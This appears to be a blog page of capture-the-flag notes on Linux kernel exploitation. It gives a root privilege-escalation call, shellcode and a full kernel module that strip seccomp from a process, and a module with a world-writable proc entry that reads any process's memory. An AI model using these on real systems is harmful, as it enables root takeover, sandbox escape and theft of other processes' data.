---
title: "k-pwn notes"
permalink: /kernel-pwn-notes
layout: single
author_profile: trues
---

# Privilege escalation
whenever you find a way to call arbitrary functions you should try to call:
```c
commit_creds(prepare_kernel_cred(0));
```
to get root privileges.
An altervative is to use:
```c
run_cmd("/bin/chmod 777 /flag");
```
or whichever command you want to run as root.


# Bypass seccomp via shellcode in kernel space
While coding in C you can do:
```c
current->thread_info.flags &= ~_TIF_SECCOMP;
```
but when shellcodeing you need to do something like:
```s
mov rax, QWORD PTR gs:0x15d00
and QWORD PTR [rax], 0xfffffffffffffeff
```
(note 0x15d00 is the offset for linux 5.4, it changes in other versions)
Generally you can compile a small C kernel module like
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <asm/thread_info.h>

MODULE_LICENSE("GPL");

void disable_seccomp(void) {
#ifdef TIF_SECCOMP
    current->thread_info.flags &= ~(1UL << TIF_SECCOMP);
#else
    current->thread_info.flags &= ~(1UL << 8);
#endif
    pr_info("PWNED: Seccomp disabilitato per %s [%d]\n", current->comm, current->pid);
}

static int my_proc_open(struct inode *inode, struct file *file) {
    disable_seccomp();
    return 0;
}

static const struct file_operations my_fops = {
    .owner = THIS_MODULE,
    .open  = my_proc_open,
};

static int __init seccomp_bypass_init(void) {
    proc_create("pwn_seccomp", 0444, NULL, &my_fops);
    pr_info("Modulo caricato su Kernel 5.4. Apri /proc/pwn_seccomp.\n");
    return 0;
}

static void __exit seccomp_bypass_exit(void) {
    remove_proc_entry("pwn_seccomp", NULL);
}

module_init(seccomp_bypass_init);
module_exit(seccomp_bypass_exit);
```
load it via `insmod`, then using gdb check the disassembly of `disable_seccomp` to find the assembly instructions you need and the correct offset.

# Read other processes memory
The kernel is allowed to read any process memory.

A kernel module that reads memory of a target pid:
```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include <linux/sched/mm.h>
#include <linux/mm.h>
#include <linux/pid.h>

#define PROC_NAME "test"
#define FLAG_LEN 64

static char flag_buf[FLAG_LEN];
static ssize_t flag_len;

static ssize_t proc_write(struct file *file,
                          const char __user *ubuf,
                          size_t count,
                          loff_t *ppos)
{
    char kbuf[64];
    pid_t pid;
    unsigned long addr;
    struct task_struct *task;
    int ret;

    if (count >= sizeof(kbuf))
        return -EINVAL;

    if (copy_from_user(kbuf, ubuf, count))
        return -EFAULT;

    kbuf[count] = '\0';

    if (sscanf(kbuf, "%d %lx", &pid, &addr) != 2)
        return -EINVAL;

    task = pid_task(find_vpid(pid), PIDTYPE_PID);
    if (!task)
        return -ESRCH;

    memset(flag_buf, 0, FLAG_LEN);

    ret = access_process_vm(task,
                            addr,
                            flag_buf,
                            FLAG_LEN,
                            0);   /* read = 0 */

    if (ret <= 0)
        return -EFAULT;

    flag_len = ret;
    return count;
}

static ssize_t proc_read(struct file *file,
                         char __user *ubuf,
                         size_t count,
                         loff_t *ppos)
{
    return simple_read_from_buffer(
        ubuf, count, ppos, flag_buf, flag_len);
}

static const struct file_operations proc_fops = {
    .owner = THIS_MODULE,
    .read  = proc_read,
    .write = proc_write,
};

static int __init mod_init(void)
{
    if (!proc_create(PROC_NAME, 0666, NULL, &proc_fops))
        return -ENOMEM;

    pr_info("module loaded\n");
    return 0;
}

static void __exit mod_exit(void)
{
    remove_proc_entry(PROC_NAME, NULL);
    pr_info("module unloaded\n");
}

MODULE_LICENSE("GPL");
module_init(mod_init);
module_exit(mod_exit);
```
This can be used by "echo <pid> <address> > /proc/test" followed by "cat /proc/test" to read memory from another process.

If you can execute arbitrary shellcode in kernel space you need to call the functions `find_vpid` and `pid_task` to get the `task_struct` of the target process, then use `access_process_vm` to read its memory. Then probably `copy_to_user` to send the data back to user space.